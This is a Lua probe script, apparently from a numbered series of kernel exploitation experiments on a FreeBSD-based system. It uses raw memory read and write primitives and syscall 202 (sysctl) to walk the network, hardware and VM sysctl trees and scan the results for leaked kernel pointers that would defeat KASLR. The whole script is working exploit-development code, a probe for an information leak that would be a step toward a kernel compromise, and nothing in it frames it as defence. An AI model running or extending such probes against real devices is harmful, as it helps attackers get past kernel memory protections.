-- CRASH_CLASS: LOW
-- PROBE 823a: CTL_NET / CTL_HW / CTL_VM leaves, scanned for kernel pointers
--
-- 699a/700a walked CTL_KERN (251 nodes) and 43o/53b tested PF_ROUTE, but the
-- socket-list leaves have never been read on 14.10. net.inet.tcp.pcblist and
-- its siblings return arrays of xtcpcb/xinpcb records, which on ordinary
-- FreeBSD carry kernel addresses. Any qword with a high half in
-- 0xFFFF8000..0xFFFFFFFF is a KASLR-bearing leak; everything else is noise.

print("=== PROBE 823a: sysctl net/hw/vm leaves ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function u(v) return uint64(v) end
local function safe_rd(a) local ok, v = pcall(function() return memory.read_dword(a) end) if ok then return to_num(v) end return nil end
local function safe_wd(a, v) return (pcall(function() memory.write_dword(a, v) end)) end

local sc202 = make_syscall(202)
local OUTSZ = 0x10000
local out = memory.alloc(OUTSZ)
local olen = memory.alloc(8)
local mib = memory.alloc(64)

local function call(name, ...)
    local parts = { ... }
    safe_wd(mib, 0); safe_wd(mib + 4, 0); safe_wd(mib + 8, 0); safe_wd(mib + 12, 0)
    for i, v in ipairs(parts) do safe_wd(mib + (i - 1) * 4, v) end
    safe_wd(olen, OUTSZ)
    local r = -99
    pcall(function() r = to_num(sc202(u(mib), u(#parts), u(out), u(olen), u(0), u(0))) end)
    local got = safe_rd(olen) or 0
    -- scan for kernel-shaped qwords
    local hits, first = 0, nil
    local limit = math.min(got, OUTSZ)
    local i = 0
    while i + 8 <= limit do
        local lo, hi = safe_rd(out + i), safe_rd(out + i + 4)
        if lo and hi and hi >= 0xFFFF8000 then
            hits = hits + 1
            if not first then first = string.format("+%04X %08X%08X", i, hi, lo) end
        end
        i = i + 4
    end
    print(string.format("[A] %-28s ret=%d len=%d kernq=%d %s", name, r, got, hits, first or ""))
    return r, got, hits
end

local hw = 0
local function bump()
    hw = hw + 1
    if hw == 3 then
        print("")
        hw = 0
    end
end

-- CTL_NET = 4
for _, family in ipairs({ 2, 3, 5, 28 }) do
    for _, proto in ipairs({ 1, 2, 3 }) do
        for leaf = 0, 20 do
            local r, got, hits = call(string.format("4 %d %d %d", family, proto, leaf), 4, family, proto, leaf)
            if r == 0 or hits > 0 then bump() end
        end
    end
end
print("")

-- net.local.pcblist and friends
for leaf = 0, 12 do
    call(string.format("4 5 1 %d", leaf), 4, 5, 1, leaf)
    call(string.format("4 5 2 %d", leaf), 4, 5, 2, leaf)
end
print("")

-- CTL_HW = 6 and CTL_VM = 2, one level
for leaf = 0, 60 do
    call(string.format("6 %d", leaf), 6, leaf)
    call(string.format("2 %d", leaf), 2, leaf)
end
print("[Z] done")
